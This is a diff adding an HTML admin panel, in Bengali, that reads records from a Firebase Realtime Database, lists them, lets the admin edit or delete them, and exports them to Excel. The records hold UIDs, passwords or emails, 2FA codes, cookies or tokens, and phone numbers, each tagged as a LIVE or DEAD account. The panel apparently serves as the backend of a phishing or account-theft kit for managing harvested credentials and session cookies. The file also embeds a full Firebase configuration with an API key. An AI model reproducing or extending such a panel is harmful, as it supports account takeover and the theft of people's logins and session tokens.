@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🇷 🇴 🇬 ADMIN PANEL | Firebase Real-time</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.sheetjs.com/xlsx-0.20.2/package/dist/xlsx.full.min.js"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+        }
+        body {
+            background: #0a0c10;
+            color: #eef;
+            padding: 18px;
+        }
+        .admin-header {
+            background: linear-gradient(135deg, #11151c, #0b0e14);
+            border-radius: 20px;
+            padding: 18px 22px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+            border: 1px solid #2a2f3a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .title-section h1 {
+            font-size: 1.7rem;
+            letter-spacing: 1px;
+        }
+        .title-section h1 i {
+            color: #ffaa44;
+            margin-right: 10px;
+        }
+        .title-section p {
+            font-size: 0.8rem;
+            color: #99a3b5;
+            margin-top: 6px;
+        }
+        .stat-badges {
+            display: flex;
+            gap: 18px;
+            background: #1e2430;
+            padding: 10px 20px;
+            border-radius: 50px;
+        }
+        .stat-badge {
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #4c9aff;
+        }
+        .stat-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 25px;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .btn {
+            background: #1f2a3a;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+        }
+        .btn-danger {
+            background: #8b2c2c;
+        }
+        .btn-success {
+            background: #1d6f42;
+        }
+        .btn-primary {
+            background: #0f5b9e;
+        }
+        .btn-warning {
+            background: #b45f1b;
+        }
+        .btn:hover {
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        }
+        .search-area {
+            background: #11161f;
+            padding: 10px 18px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #2c3543;
+        }
+        .search-area input {
+            background: transparent;
+            border: none;
+            color: white;
+            padding: 8px 0;
+            width: 200px;
+            outline: none;
+        }
+        .table-container {
+            overflow-x: auto;
+            border-radius: 20px;
+            background: #0e121b;
+            border: 1px solid #262e3c;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 700px;
+        }
+        th, td {
+            padding: 14px 12px;
+            text-align: left;
+            border-bottom: 1px solid #222a36;
+        }
+        th {
+            background: #141c26;
+            color: #bbd4ff;
+            font-weight: 600;
+            font-size: 0.85rem;
+            letter-spacing: 0.5px;
+        }
+        tr:hover {
+            background: #1a212d;
+        }
+        .record-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-live-badge {
+            color: #6fcf97;
+            background: #1e3629;
+            padding: 4px 10px;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+        .action-icons i {
+            margin: 0 6px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: 0.2s;
+        }
+        .action-icons i.fa-trash-can { color: #e06c6c; }
+        .action-icons i.fa-pen-to-square { color: #6ea8fe; }
+        .action-icons i:hover { transform: scale(1.2); }
+        .empty-row td {
+            text-align: center;
+            padding: 40px;
+            color: #7c879b;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            backdrop-filter: blur(4px);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-card {
+            background: #171e2a;
+            max-width: 520px;
+            width: 90%;
+            border-radius: 28px;
+            padding: 24px;
+            border-top: 4px solid #3c7bcb;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
+        }
+        .modal-card h3 {
+            margin-bottom: 18px;
+            border-left: 5px solid #3c7bcb;
+            padding-left: 15px;
+        }
+        .modal-card input, .modal-card textarea {
+            width: 100%;
+            background: #0e131c;
+            border: 1px solid #2f394b;
+            padding: 12px;
+            margin: 8px 0 16px;
+            border-radius: 14px;
+            color: white;
+            font-size: 0.9rem;
+        }
+        .modal-card textarea {
+            min-height: 80px;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+        }
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1d2c3a;
+            backdrop-filter: blur(10px);
+            padding: 12px 25px;
+            border-radius: 60px;
+            color: white;
+            z-index: 1200;
+            transition: 0.3s;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+            pointer-events: none;
+        }
+        .live-badge { background: #1d6f42; }
+        .dead-badge { background: #8b2c2c; }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.7rem;
+            color: #5f6c7e;
+        }
+        @media (max-width: 620px) {
+            .toolbar { flex-direction: column; align-items: stretch; }
+            .search-area { justify-content: space-between; }
+        }
+        .sync-status {
+            font-size: 0.7rem;
+            background: #1e5f3a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+<div class="admin-header">
+    <div class="title-section">
+        <h1><i class="fa-solid fa-shield-haltered"></i> 🇷 🇴 🇬 ADMIN PANEL</h1>
+        <p>⚡ Firebase Real-time Sync | লাইভ ডাটা আপডেট</p>
+    </div>
+    <div class="stat-badges">
+        <div class="stat-badge"><div class="stat-number" id="totalRecordsCount">0</div><div class="stat-label">মোট রেকর্ড</div></div>
+        <div class="stat-badge"><div class="stat-number" id="liveCount">0</div><div class="stat-label">লাইভ</div></div>
+        <div class="stat-badge"><div class="stat-number" id="deadCount">0</div><div class="stat-label">ডেড</div></div>
+    </div>
+</div>
+
+<div class="toolbar">
+    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+        <button class="btn btn-success" id="exportExcelBtn"><i class="fa-solid fa-file-excel"></i> XLSX এক্সপোর্ট</button>
+        <button class="btn btn-primary" id="refreshBtn"><i class="fa-solid fa-rotate-right"></i> রিফ্রেশ</button>
+        <button class="btn btn-warning" id="clearAllAdminBtn"><i class="fa-solid fa-trash-can"></i> সব রেকর্ড ডিলিট</button>
+    </div>
+    <div class="search-area">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="text" id="searchInput" placeholder="UID / পাসওয়ার্ড / টোকেন অনুসন্ধান...">
+    </div>
+</div>
+
+<div class="table-container">
+    <table id="adminTable">
+        <thead>
+            <tr><th>#</th><th>UID (আইডি)</th><th>পাসওয়ার্ড/মেইল</th><th>2FA/কুকি</th><th>অতিরিক্ত তথ্য</th><th>কলাম 5</th><th>স্ট্যাটাস</th><th>অ্যাকশন</th></tr>
+        </thead>
+        <tbody id="tableBody">
+            <tr><td colspan="8" style="text-align:center; padding:40px;"><i class="fa-solid fa-spinner fa-pulse"></i> Firebase থেকে ডাটা লোড হচ্ছে...</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<div id="editModal" class="modal">
+    <div class="modal-card">
+        <h3><i class="fa-regular fa-pen-to-square"></i> রেকর্ড এডিট করুন</h3>
+        <label>UID / আইডি</label>
+        <input type="text" id="edit_uid" placeholder="UID">
+        <label>পাসওয়ার্ড/ইমেইল</label>
+        <input type="text" id="edit_email" placeholder="পাসওয়ার্ড">
+        <label>2FA / কুকি / কোড</label>
+        <textarea id="edit_token" placeholder="2FA বা কুকি"></textarea>
+        <label>অতিরিক্ত তথ্য</label>
+        <input type="text" id="edit_info" placeholder="মেইল বা নোট">
+        <label>কলাম 5 (নাম্বার)</label>
+        <input type="text" id="edit_kolom5" placeholder="ফোন নাম্বার ইচ্ছামতো">
+        <div class="modal-actions">
+            <button class="btn" id="closeModalBtn">বাতিল</button>
+            <button class="btn btn-primary" id="saveEditBtn">সেভ পরিবর্তন</button>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <i class="fa-regular fa-database"></i> Firebase Real-time Database | ইউজার অ্যাপের সাথে সম্পূর্ণ সিঙ্ক্রোনাইজড
+</footer>
+
+<script>
+    // ==================== FIREBASE CONFIGURATION ====================
+    const firebaseConfig = {
+        apiKey: "AIzaSyC2XBc8qAVLRiVah45JEkGGaLks0PH_Iao",
+        authDomain: "khelo-pro-3f729.firebaseapp.com",
+        databaseURL: "https://khelo-pro-3f729-default-rtdb.firebaseio.com",
+        projectId: "khelo-pro-3f729",
+        storageBucket: "khelo-pro-3f729.firebasestorage.app",
+        messagingSenderId: "732374982070",
+        appId: "1:732374982070:web:a7c1fe819e6eaa9657f517",
+        measurementId: "G-J8YVFCDZGC"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const recordsRef = database.ref('secure_sheet_records');
+
+    // Global variables
+    let adminRecords = []; // Store records with IDs
+    let currentEditId = null;
+
+    // DOM elements
+    const tbody = document.getElementById("tableBody");
+    const searchInput = document.getElementById("searchInput");
+    const totalSpan = document.getElementById("totalRecordsCount");
+    const liveSpan = document.getElementById("liveCount");
+    const deadSpan = document.getElementById("deadCount");
+    const exportBtn = document.getElementById("exportExcelBtn");
+    const refreshBtn = document.getElementById("refreshBtn");
+    const clearAllBtn = document.getElementById("clearAllAdminBtn");
+    const editModal = document.getElementById("editModal");
+    const closeModalBtn = document.getElementById("closeModalBtn");
+    const saveEditBtn = document.getElementById("saveEditBtn");
+
+    // Toast notification
+    function showToast(message, isError = false) {
+        let toastDiv = document.querySelector(".toast-msg");
+        if (!toastDiv) {
+            toastDiv = document.createElement("div");
+            toastDiv.className = "toast-msg";
+            document.body.appendChild(toastDiv);
+        }
+        toastDiv.innerHTML = `<i class="fa-regular fa-bell"></i> ${message}`;
+        toastDiv.style.background = isError ? "#a1302c" : "#1f4f2d";
+        toastDiv.style.opacity = "1";
+        toastDiv.style.bottom = "30px";
+        setTimeout(() => { toastDiv.style.opacity = "0"; }, 2800);
+    }
+
+    // Listen to Firebase real-time changes
+    function listenToFirebase() {
+        recordsRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                adminRecords = Object.keys(data).map(key => ({
+                    id: key,
+                    ...data[key]
+                }));
+                // Sort by createdAt descending (newest first)
+                adminRecords.sort((a, b) => {
+                    if (a.createdAt && b.createdAt) {
+                        return new Date(b.createdAt) - new Date(a.createdAt);
+                    }
+                    return 0;
+                });
+            } else {
+                adminRecords = [];
+            }
+            renderTable();
+            updateStats();
+            showToast("📡 Firebase থেকে লাইভ ডাটা আপডেট হয়েছে!");
+        }, (error) => {
+            console.error("Firebase listen error:", error);
+            showToast("⚠️ Firebase সংযোগে সমস্যা!", true);
+            tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:40px;">❌ Firebase সংযোগ ব্যর্থ! নেটওয়ার্ক চেক করুন।</td></tr>`;
+        });
+    }
+
+    function updateStats() {
+        totalSpan.innerText = adminRecords.length;
+        const live = adminRecords.filter(r => r.status === "live").length;
+        const dead = adminRecords.filter(r => r.status === "dead").length;
+        liveSpan.innerText = live;
+        deadSpan.innerText = dead;
+    }
+
+    function renderTable() {
+        const searchTerm = searchInput.value.toLowerCase();
+        let filtered = adminRecords;
+        if (searchTerm !== "") {
+            filtered = adminRecords.filter(rec => 
+                (rec.coverid && rec.coverid.toLowerCase().includes(searchTerm)) ||
+                (rec.email && rec.email.toLowerCase().includes(searchTerm)) ||
+                (rec.bebas && rec.bebas.toLowerCase().includes(searchTerm)) ||
+                (rec.info_tambahan && rec.info_tambahan.toLowerCase().includes(searchTerm))
+            );
+        }
+        
+        if (filtered.length === 0) {
+            tbody.innerHTML = `<tr class="empty-row"><td colspan="8">📭 কোন রেকর্ড নেই। ইউজার অ্যাপ থেকে ডাটা সেভ করলে এখানে দেখা যাবে।</td></tr>`;
+            return;
+        }
+        
+        let html = "";
+        filtered.forEach((rec, idx) => {
+            let statusHtml = `<span class="status-live-badge" style="background:#2a2f3a;"><span class="record-status" style="background:#777;"></span> ⚠️ অপরীক্ষিত</span>`;
+            if (rec.status === "live") statusHtml = `<span class="status-live-badge live-badge"><span class="record-status" style="background:#35d46a;"></span> ✅ LIVE</span>`;
+            if (rec.status === "dead") statusHtml = `<span class="status-live-badge dead-badge"><span class="record-status" style="background:#f55;"></span> ❌ DEAD</span>`;
+            
+            html += `<tr>
+                <td>${idx+1}</td>
+                <td><strong>${escapeHtml(rec.coverid || '')}</strong></td>
+                <td>${escapeHtml(rec.email || '')}</td>
+                <td style="max-width:220px; word-break:break-all;">${escapeHtml(truncateText(rec.bebas || '', 40))}</td>
+                <td>${escapeHtml(rec.info_tambahan || '-')}</td>
+                <td>${escapeHtml(rec.kolom5 || '-')}</td>
+                <td>${statusHtml}</td>
+                <td class="action-icons">
+                    <i class="fa-regular fa-pen-to-square" onclick="openEditModal('${rec.id}')" title="Edit"></i>
+                    <i class="fa-solid fa-trash-can" onclick="deleteSingleRecord('${rec.id}')" title="Delete"></i>
+                </td>
+            </tr>`;
+        });
+        tbody.innerHTML = html;
+    }
+
+    function escapeHtml(str) {
+        if(!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if(m === '&') return '&amp;';
+            if(m === '<') return '&lt;';
+            if(m === '>') return '&gt;';
+            return m;
+        });
+    }
+    
+    function truncateText(txt, len) {
+        if(!txt) return '';
+        if(txt.length <= len) return txt;
+        return txt.substr(0, len) + '...';
+    }
+
+    // Delete single record from Firebase
+    window.deleteSingleRecord = function(id) {
+        if (confirm("আপনি কি এই রেকর্ড স্থায়ীভাবে মুছে ফেলতে চান?")) {
+            recordsRef.child(id).remove()
+                .then(() => showToast("🗑️ রেকর্ড ডিলিট হয়েছে!"))
+                .catch(err => showToast("ডিলিট ব্যর্থ!", true));
+        }
+    };
+
+    // Open edit modal
+    window.openEditModal = function(id) {
+        const record = adminRecords.find(r => r.id === id);
+        if (record) {
+            currentEditId = id;
+            document.getElementById("edit_uid").value = record.coverid || '';
+            document.getElementById("edit_email").value = record.email || '';
+            document.getElementById("edit_token").value = record.bebas || '';
+            document.getElementById("edit_info").value = record.info_tambahan || '';
+            document.getElementById("edit_kolom5").value = record.kolom5 || '';
+            editModal.style.display = "flex";
+        } else {
+            showToast("রেকর্ড খুঁজে পাওয়া যায়নি", true);
+        }
+    };
+
+    function saveEditedRecord() {
+        if (!currentEditId) return;
+        
+        const updatedData = {
+            coverid: document.getElementById("edit_uid").value.trim(),
+            email: document.getElementById("edit_email").value.trim(),
+            bebas: document.getElementById("edit_token").value.trim(),
+            info_tambahan: document.getElementById("edit_info").value.trim(),
+            kolom5: document.getElementById("edit_kolom5").value.trim(),
+            updatedAt: new Date().toISOString()
+        };
+        
+        recordsRef.child(currentEditId).update(updatedData)
+            .then(() => {
+                showToast("✏️ রেকর্ড আপডেট হয়েছে!");
+                editModal.style.display = "none";
+                currentEditId = null;
+            })
+            .catch(err => showToast("আপডেট ব্যর্থ!", true));
+    }
+
+    // Delete all records from Firebase
+    function clearAllAdminOnly() {
+        if (confirm("⚠️ সতর্কতা: সব রেকর্ড স্থায়ীভাবে মুছে যাবে! আপনি কি নিশ্চিত?")) {
+            recordsRef.remove()
+                .then(() => showToast("🧹 সব রেকর্ড মুছে ফেলা হয়েছে!"))
+                .catch(err => showToast("ডিলিট ব্যর্থ!", true));
+        }
+    }
+
+    // Export to Excel
+    function exportToExcel() {
+        if (adminRecords.length === 0) {
+            showToast("কোন রেকর্ড নেই, এক্সপোর্ট অসম্ভব!", true);
+            return;
+        }
+        
+        const sheetData = adminRecords.map(rec => ({
+            "UID (আইডি)": rec.coverid || '',
+            "পাসওয়ার্ড/মেইল": rec.email || '',
+            "2FA/কুকি/টোকেন": rec.bebas || '',
+            "অতিরিক্ত তথ্য": rec.info_tambahan || '',
+            "কলাম 5": rec.kolom5 || '',
+            "স্ট্যাটাস": rec.status === 'live' ? 'Live' : (rec.status === 'dead' ? 'Dead' : 'Not checked'),
+            "তৈরির তারিখ": rec.createdAt || '',
+            "শেষ আপডেট": rec.updatedAt || ''
+        }));
+        
+        const ws = XLSX.utils.json_to_sheet(sheetData);
+        const wb = XLSX.utils.book_new();
+        XLSX.utils.book_append_sheet(wb, ws, "ROG_ADMIN_DATA");
+        XLSX.writeFile(wb, `rog_admin_backup_${new Date().toISOString().slice(0,19)}.xlsx`);
+        showToast("📁 এক্সেল ফাইল ডাউনলোড শুরু!");
+    }
+
+    // Event listeners
+    exportBtn.addEventListener("click", exportToExcel);
+    refreshBtn.addEventListener("click", () => {
+        showToast("🔄 রিফ্রেশ করা হচ্ছে...");
+        // Firebase will automatically re-trigger the listener
+    });
+    clearAllBtn.addEventListener("click", clearAllAdminOnly);
+    searchInput.addEventListener("input", () => renderTable());
+    closeModalBtn.addEventListener("click", () => { editModal.style.display = "none"; currentEditId = null; });
+    saveEditBtn.addEventListener("click", saveEditedRecord);
+    window.addEventListener("click", (e) => { if (e.target === editModal) editModal.style.display = "none"; });
+
+    // Initialize Firebase listener
+    listenToFirebase();
+    
+    console.log("✅ এডমিন প্যানেল চালু - Firebase Real-time সক্রিয়");
+</script>
+</body>
+</html>
